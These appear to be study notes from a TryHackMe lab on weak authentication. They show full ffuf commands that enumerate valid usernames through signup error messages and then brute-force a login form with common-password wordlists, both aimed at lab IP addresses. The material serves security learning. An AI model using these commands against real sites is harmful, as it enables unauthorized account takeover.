Common flaws in authentication mechanism that allow bypassing.

# 1. Username enumeration
Very helpful practice when trying to find auth vulns is creating a list of valid usernames, which we'll use later in other tasks.
This is usually done through website error messages. For example: `An account with this username already exists` 
The ffuf tool uses a list of commonly used usernames to check against for any matches.
```shell-session
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.56.253/customers/signup -mr "username already exists" > usernames.txt
```
`-X` - specify the HTTP method
`-d` - specify the data that will be sent.
`-H` - specify the content type header as form data.
`-u` - specify the URL.
`-mr` - specify the regex expression for successful enum.

## 2. Brute Force
With the valid usernames already listed, we can attempt to brute force the login page. This is an automated process that tries a list of commonly used passwords against one or a list of usernames.

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.80.116/customers/login -fc 200
```
`-fc` - Ignores 200 codes, for when successful login returns 302 codes for example.
